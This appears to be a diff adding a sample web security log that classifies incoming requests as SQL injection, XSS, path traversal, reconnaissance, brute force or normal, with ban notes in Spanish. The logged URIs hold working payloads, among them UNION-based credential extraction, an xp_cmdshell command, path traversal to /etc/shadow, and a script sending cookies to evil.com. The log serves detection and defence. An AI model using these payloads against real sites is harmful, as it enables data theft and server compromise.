@@ -1,0 +1,80 @@
+[2026-03-24 02:15:33] [CRITICAL] Type: SQL_INJECTION | IP: 185.220.101.34 [BANEADO POR 24h] | URI: /api/users?id=1' UNION SELECT * FROM users-- | Method: GET | UA: sqlmap/1.7.2#stable (https://sqlmap.org)
+[2026-03-24 02:15:45] [CRITICAL] Type: SQL_INJECTION | IP: 185.220.101.34 [BANEADO POR 24h] | URI: /api/login?user=admin' OR '1'='1 | Method: POST | UA: sqlmap/1.7.2#stable (https://sqlmap.org)
+[2026-03-24 02:16:01] [HIGH] Type: XSS_ATTACK | IP: 45.33.32.156 | URI: /search?q=<script>alert('XSS')</script> | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+[2026-03-24 02:16:15] [HIGH] Type: XSS_ATTACK | IP: 45.33.32.156 | URI: /comment?body=<img onerror=alert(document.cookie) src=x> | Method: POST | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+[2026-03-24 02:17:22] [WARNING] Type: DIRECTORY_TRAVERSAL | IP: 91.121.87.10 | URI: /files?path=../../../../etc/passwd | Method: GET | UA: python-requests/2.28.0
+[2026-03-24 02:17:35] [WARNING] Type: DIRECTORY_TRAVERSAL | IP: 91.121.87.10 | URI: /download?file=../../../etc/shadow | Method: GET | UA: python-requests/2.28.0
+[2026-03-24 02:18:00] [CRITICAL] Type: RECONNAISSANCE | IP: 58.218.92.37 | URI: /.env | Method: GET | UA: Go-http-client/1.1
+[2026-03-24 02:18:05] [CRITICAL] Type: RECONNAISSANCE | IP: 58.218.92.37 | URI: /.git/config | Method: GET | UA: Go-http-client/1.1
+[2026-03-24 02:18:10] [HIGH] Type: RECONNAISSANCE | IP: 58.218.92.37 | URI: /wp-admin/ | Method: GET | UA: Go-http-client/1.1
+[2026-03-24 02:18:15] [HIGH] Type: RECONNAISSANCE | IP: 58.218.92.37 | URI: /phpmyadmin/ | Method: GET | UA: Go-http-client/1.1
+[2026-03-24 02:18:20] [WARNING] Type: RECONNAISSANCE | IP: 58.218.92.37 | URI: /robots.txt | Method: GET | UA: Go-http-client/1.1
+[2026-03-24 02:18:25] [WARNING] Type: RECONNAISSANCE | IP: 58.218.92.37 | URI: /sitemap.xml | Method: GET | UA: Go-http-client/1.1
+[2026-03-24 02:19:00] [HIGH] Type: BOT_SCAN | IP: 71.6.135.131 | URI: /api/v1/users | Method: GET | UA: Nmap Scripting Engine; https://nmap.org/book/nse.html
+[2026-03-24 02:19:05] [HIGH] Type: BOT_SCAN | IP: 71.6.135.131 | URI: /api/v1/admin | Method: GET | UA: Nmap Scripting Engine; https://nmap.org/book/nse.html
+[2026-03-24 02:19:10] [HIGH] Type: BOT_SCAN | IP: 71.6.135.131 | URI: /api/v1/config | Method: GET | UA: Nmap Scripting Engine; https://nmap.org/book/nse.html
+[2026-03-24 02:20:00] [CRITICAL] Type: BRUTE_FORCE | IP: 46.101.245.89 [BANEADO POR 1h] | URI: /login | Method: POST | UA: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+[2026-03-24 02:20:05] [CRITICAL] Type: BRUTE_FORCE | IP: 46.101.245.89 [BANEADO POR 1h] | URI: /login | Method: POST | UA: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+[2026-03-24 02:20:10] [CRITICAL] Type: BRUTE_FORCE | IP: 46.101.245.89 [BANEADO POR 1h] | URI: /login | Method: POST | UA: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+[2026-03-24 02:20:15] [CRITICAL] Type: BRUTE_FORCE | IP: 46.101.245.89 [BANEADO POR 1h] | URI: /login | Method: POST | UA: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+[2026-03-24 02:20:20] [CRITICAL] Type: BRUTE_FORCE | IP: 46.101.245.89 [BANEADO POR 1h] | URI: /login | Method: POST | UA: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+[2026-03-24 02:21:00] [WARNING] Type: RATE_LIMIT | IP: 103.152.220.44 | URI: /api/search | Method: GET | UA: curl/7.88.1
+[2026-03-24 02:21:05] [WARNING] Type: RATE_LIMIT | IP: 103.152.220.44 | URI: /api/search | Method: GET | UA: curl/7.88.1
+[2026-03-24 02:21:10] [WARNING] Type: RATE_LIMIT | IP: 103.152.220.44 | URI: /api/search | Method: GET | UA: curl/7.88.1
+[2026-03-24 02:22:00] [HIGH] Type: HONEYPOT | IP: 195.154.179.3 | URI: /trap | Method: GET | UA: Nikto/2.1.6
+[2026-03-24 02:22:05] [HIGH] Type: HONEYPOT | IP: 195.154.179.3 | URI: /debug | Method: GET | UA: Nikto/2.1.6
+[2026-03-24 02:22:10] [HIGH] Type: HONEYPOT | IP: 195.154.179.3 | URI: /phpinfo.php | Method: GET | UA: Nikto/2.1.6
+[2026-03-24 02:22:15] [HIGH] Type: HONEYPOT | IP: 195.154.179.3 | URI: /server-status | Method: GET | UA: Nikto/2.1.6
+[2026-03-24 02:23:00] [INFO] Type: NORMAL | IP: 200.68.120.15 | URI: /index.html | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36
+[2026-03-24 02:23:05] [INFO] Type: NORMAL | IP: 200.68.120.15 | URI: /styles.css | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36
+[2026-03-24 02:23:10] [INFO] Type: NORMAL | IP: 200.68.120.15 | URI: /app.js | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36
+[2026-03-24 02:24:00] [INFO] Type: NORMAL | IP: 201.141.95.22 | URI: /api/products | Method: GET | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15
+[2026-03-24 02:24:30] [INFO] Type: NORMAL | IP: 168.196.88.200 | URI: /api/categories | Method: GET | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15
+[2026-03-24 02:25:00] [WARNING] Type: SUSPICIOUS | IP: 118.25.6.39 [BANEADO POR 6h] | URI: /admin/dashboard | Method: GET | UA: python-urllib3/2.0.4
+[2026-03-24 02:25:30] [CRITICAL] Type: SQL_INJECTION | IP: 82.165.77.211 | URI: /api/products?id=1;DROP TABLE products;-- | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+[2026-03-24 02:26:00] [HIGH] Type: XSS_ATTACK | IP: 82.165.77.211 | URI: /feedback?msg=<script>document.location='http://evil.com/steal?c='+document.cookie</script> | Method: POST | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+[2026-03-24 02:26:30] [WARNING] Type: SUSPICIOUS | IP: 134.209.29.78 | URI: /api/debug | Method: GET | UA: HTTPie/3.2.1
+[2026-03-24 02:27:00] [HIGH] Type: BOT_SCAN | IP: 51.15.43.205 | URI: /xmlrpc.php | Method: POST | UA: WPScan v3.8.25 (https://wpscan.com/)
+[2026-03-24 02:27:30] [HIGH] Type: BOT_SCAN | IP: 51.15.43.205 | URI: /wp-login.php | Method: GET | UA: WPScan v3.8.25 (https://wpscan.com/)
+[2026-03-24 02:28:00] [CRITICAL] Type: SQL_INJECTION | IP: 77.247.181.163 | URI: /api/search?q=1' AND SLEEP(5)-- | Method: GET | UA: sqlmap/1.7.2#stable
+[2026-03-24 02:28:30] [HIGH] Type: DIRECTORY_TRAVERSAL | IP: 77.247.181.163 | URI: /files/..%2f..%2f..%2fetc%2fpasswd | Method: GET | UA: sqlmap/1.7.2#stable
+[2026-03-24 02:29:00] [INFO] Type: NORMAL | IP: 143.198.45.67 | URI: /api/status | Method: GET | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Firefox/121.0
+[2026-03-24 02:29:30] [WARNING] Type: RECONNAISSANCE | IP: 64.62.197.18 | URI: /.well-known/security.txt | Method: GET | UA: Mozilla/5.0 (compatible; CensysInspect/1.1)
+[2026-03-24 02:30:00] [HIGH] Type: SQL_INJECTION | IP: 185.220.101.34 [BANEADO POR 24h] | URI: /api/users?name=admin' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT password FROM users LIMIT 1)))-- | Method: GET | UA: sqlmap/1.7.2#stable
+[2026-03-24 02:30:30] [INFO] Type: NORMAL | IP: 190.25.44.100 | URI: /products/list | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0
+[2026-03-24 02:31:00] [WARNING] Type: BOT_SCAN | IP: 162.243.128.55 | URI: /actuator/health | Method: GET | UA: nuclei/v3.0.4 (https://github.com/projectdiscovery/nuclei)
+[2026-03-24 02:31:30] [HIGH] Type: HONEYPOT | IP: 162.243.128.55 | URI: /.aws/credentials | Method: GET | UA: nuclei/v3.0.4 (https://github.com/projectdiscovery/nuclei)
+[2026-03-24 02:32:00] [INFO] Type: NORMAL | IP: 201.141.95.22 | URI: /checkout | Method: POST | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15
+[2026-03-24 02:32:30] [CRITICAL] Type: BRUTE_FORCE | IP: 89.248.172.16 [BANEADO POR 48h] | URI: /admin/login | Method: POST | UA: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
+[2026-03-24 02:32:35] [CRITICAL] Type: BRUTE_FORCE | IP: 89.248.172.16 [BANEADO POR 48h] | URI: /admin/login | Method: POST | UA: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
+[2026-03-24 02:32:40] [CRITICAL] Type: BRUTE_FORCE | IP: 89.248.172.16 [BANEADO POR 48h] | URI: /admin/login | Method: POST | UA: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
+[2026-03-24 02:33:00] [WARNING] Type: RATE_LIMIT_ABUSE | IP: 156.67.111.23 | URI: /api/v2/data | Method: GET | UA: wget/1.21
+[2026-03-24 02:33:05] [WARNING] Type: RATE_LIMIT_ABUSE | IP: 156.67.111.23 | URI: /api/v2/data | Method: GET | UA: wget/1.21
+[2026-03-24 02:33:10] [WARNING] Type: RATE_LIMIT_ABUSE | IP: 156.67.111.23 | URI: /api/v2/data | Method: GET | UA: wget/1.21
+[2026-03-24 02:33:15] [WARNING] Type: RATE_LIMIT_ABUSE | IP: 156.67.111.23 | URI: /api/v2/data | Method: GET | UA: wget/1.21
+[2026-03-24 02:34:00] [HIGH] Type: XSS_ATTACK | IP: 213.32.75.92 | URI: /profile?bio=<svg onload=alert(1)> | Method: POST | UA: Mozilla/5.0 (Android 13; Mobile; rv:109.0) Firefox/120.0
+[2026-03-24 02:34:30] [INFO] Type: NORMAL | IP: 200.68.120.15 | URI: /api/notifications | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36
+[2026-03-24 02:35:00] [WARNING] Type: SUSPICIOUS | IP: 37.120.198.208 | URI: /backup.sql | Method: GET | UA: curl/8.1.2
+[2026-03-24 02:35:30] [HIGH] Type: SQL_INJECTION | IP: 37.120.198.208 | URI: /api/report?start=2024-01-01&end=2024-12-31' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password),NULL FROM admin_users-- | Method: GET | UA: curl/8.1.2
+[2026-03-24 02:36:00] [INFO] Type: NORMAL | IP: 168.196.88.200 | URI: /api/profile | Method: GET | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15
+[2026-03-24 02:36:30] [CRITICAL] Type: RECONNAISSANCE | IP: 80.82.77.139 | URI: /config.php.bak | Method: GET | UA: masscan/1.3 (https://github.com/robertdavidgraham/masscan)
+[2026-03-24 02:37:00] [CRITICAL] Type: RECONNAISSANCE | IP: 80.82.77.139 | URI: /database.sql.gz | Method: GET | UA: masscan/1.3 (https://github.com/robertdavidgraham/masscan)
+[2026-03-24 02:37:30] [INFO] Type: NORMAL | IP: 190.25.44.100 | URI: /contact | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0
+[2026-03-24 02:38:00] [HIGH] Type: BOT_SCAN | IP: 104.248.185.94 | URI: /graphql | Method: POST | UA: python-requests/2.31.0
+[2026-03-24 02:38:30] [HIGH] Type: BOT_SCAN | IP: 104.248.185.94 | URI: /api/v1/admin/users | Method: GET | UA: python-requests/2.31.0
+[2026-03-24 02:39:00] [CRITICAL] Type: SQL_INJECTION | IP: 45.33.32.156 [BANEADO POR 12h] | URI: /api/v2/users?filter=1;EXEC xp_cmdshell('whoami');-- | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+[2026-03-24 02:39:30] [INFO] Type: NORMAL | IP: 143.198.45.67 | URI: /about | Method: GET | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Firefox/121.0
+[2026-03-24 02:40:00] [WARNING] Type: SUSPICIOUS | IP: 128.199.55.201 | URI: /console | Method: GET | UA: httpx/0.25.0
+[2026-03-24 02:40:30] [HIGH] Type: DIRECTORY_TRAVERSAL | IP: 128.199.55.201 | URI: /static/../../../proc/self/environ | Method: GET | UA: httpx/0.25.0
+[2026-03-24 02:41:00] [INFO] Type: NORMAL | IP: 201.141.95.22 | URI: /api/orders | Method: GET | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15
+[2026-03-24 02:41:30] [HIGH] Type: HONEYPOT | IP: 23.105.131.186 | URI: /shell | Method: POST | UA: Java/11.0.16
+[2026-03-24 02:42:00] [INFO] Type: NORMAL | IP: 200.68.120.15 | URI: /privacy-policy | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36
+[2026-03-24 02:42:30] [CRITICAL] Type: SQL_INJECTION | IP: 185.220.101.34 [BANEADO POR 24h] | URI: /api/admin?token=' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- | Method: GET | UA: sqlmap/1.7.2#stable
+[2026-03-24 02:43:00] [WARNING] Type: BOT_SCAN | IP: 209.17.96.58 | URI: /cgi-bin/test | Method: GET | UA: Wapiti/3.1.7 (wapiti-scanner.github.io)
+[2026-03-24 02:43:30] [HIGH] Type: XSS_ATTACK | IP: 209.17.96.58 | URI: /search?term=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41)) | Method: GET | UA: Wapiti/3.1.7 (wapiti-scanner.github.io)
+[2026-03-24 02:44:00] [INFO] Type: NORMAL | IP: 190.25.44.100 | URI: /help | Method: GET | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0
+[2026-03-24 02:44:30] [CRITICAL] Type: BRUTE_FORCE | IP: 178.128.123.45 [BANEADO POR 24h] | URI: /api/auth/login | Method: POST | UA: python-requests/2.31.0
+[2026-03-24 02:44:35] [CRITICAL] Type: BRUTE_FORCE | IP: 178.128.123.45 [BANEADO POR 24h] | URI: /api/auth/login | Method: POST | UA: python-requests/2.31.0
+[2026-03-24 02:44:40] [CRITICAL] Type: BRUTE_FORCE | IP: 178.128.123.45 [BANEADO POR 24h] | URI: /api/auth/login | Method: POST | UA: python-requests/2.31.0
+[2026-03-24 02:44:45] [CRITICAL] Type: BRUTE_FORCE | IP: 178.128.123.45 [BANEADO POR 24h] | URI: /api/auth/login | Method: POST | UA: python-requests/2.31.0
+[2026-03-24 02:44:50] [CRITICAL] Type: BRUTE_FORCE | IP: 178.128.123.45 [BANEADO POR 24h] | URI: /api/auth/login | Method: POST | UA: python-requests/2.31.0
